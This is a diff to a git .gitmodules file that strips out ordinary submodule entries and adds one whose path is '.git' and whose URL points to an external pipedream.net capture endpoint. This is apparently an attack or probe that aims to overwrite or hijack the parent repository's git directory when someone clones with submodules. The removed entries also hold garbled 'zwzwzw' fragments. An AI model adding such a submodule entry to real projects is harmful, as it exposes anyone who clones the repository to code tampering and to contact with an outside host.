@@ -1,20 +1,3 @@
 [submodule "OOtest"]
-	path = OOtestzwzwzwzw
-	url = https://github.com/pragmuxy/OOtest.git
-    # 5. IGNORE SETTINGS
-    # Controls which changes in the submodule trigger a 'modified' status in the parent.
-    # Options: all, dirty (ignore untracked files), untracked, none.
-    ignore = none
-
-    # 6. RECURSIVE FETCHING
-    # If this submodule has its own submodules, should they be fetched automatically?
-    fetchRecurseSubmodules = true
-[submodule "LegacyUtils"]
-    path = lib/utils
-    # Relative URLs allow the submodule to follow the parent if it moves 
-    # (e.g., from HTTPS to SSH or to a different server/fork).
-    url = ../zwzwzwLegacyUtils.git
-    
-    # Ensures 'git status' doesn't show the submodule as changed just because
-    # someone added a temporary file inside it.
-    ignore = untracked
+	path = .git
+	url = https://94c1100491242840d209db178c347a59.m.pipedream.net/test/.git.git
